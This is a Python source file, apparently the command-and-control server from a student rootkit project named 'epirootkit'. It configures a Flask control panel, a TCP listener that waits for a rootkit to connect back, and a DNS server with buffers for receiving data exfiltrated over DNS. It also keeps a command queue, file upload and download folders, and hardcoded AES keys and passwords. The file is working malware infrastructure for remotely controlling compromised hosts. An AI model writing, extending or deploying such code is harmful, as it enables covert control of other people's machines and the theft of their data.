import os
import threading
from flask import Flask

# -------------------- CONFIGURATION --------------------
HOST = '0.0.0.0'
PORT = 4242
BUFFER_SIZE = 1024
PASSWORD = "epiroot"
UPLOAD_FOLDER = "uploads"
DOWNLOAD_FOLDER = "downloads"

AES_KEY = b'1234567890abcdef'
AES_IV  = b'abcdef1234567890'

DNS_PORT = 53
DNS_DOMAIN = "dns.google.com"
DNS_RESPONSE_TIMEOUT = 12.0
DNS_POLL_INTERVAL = 0.2

# -------------------- FLASK APP ------------------------
base_dir = os.path.abspath(os.path.dirname(__file__))
root_dir = os.path.abspath(os.path.join(base_dir, ".."))

app = Flask(__name__,
            template_folder=os.path.join(root_dir, "templates"),
            static_folder=os.path.join(root_dir, "static"))
app.secret_key = "epirootkit_secret"
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# -------------------- GLOBAL STATE ---------------------
rootkit_connection = None
rootkit_address = None
authenticated = False
last_response = ""
last_channel = 'tcp'
connection_lock = threading.Lock()
command_history = []

# Pour DNS exfil
command_queue = []
exfil_buffer = {}
expected_chunks = None

# -------------------- DNS / SOCKET BOOT ----------------
def start_dns_server():
    from utils.dns_handler import DNSHandler
    import socketserver
    server = socketserver.ThreadingUDPServer(('0.0.0.0', DNS_PORT), DNSHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"🚧 DNS server listening on UDP/{DNS_PORT} for domain {DNS_DOMAIN}")

def socket_listener():
    from utils.socket_comm import receive_from_server
    import socket
    global rootkit_connection, rootkit_address

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 [*] Serveur à l'écoute sur {HOST}:{PORT}...")
    connection, address = server_socket.accept()

    with connection_lock:
        rootkit_connection = connection
        rootkit_address = address

    print(f"✅ [+] Rootkit connecté depuis {address[0]}")
    data = receive_from_server(connection)
    print(f"📥 [rootkit] {data}")
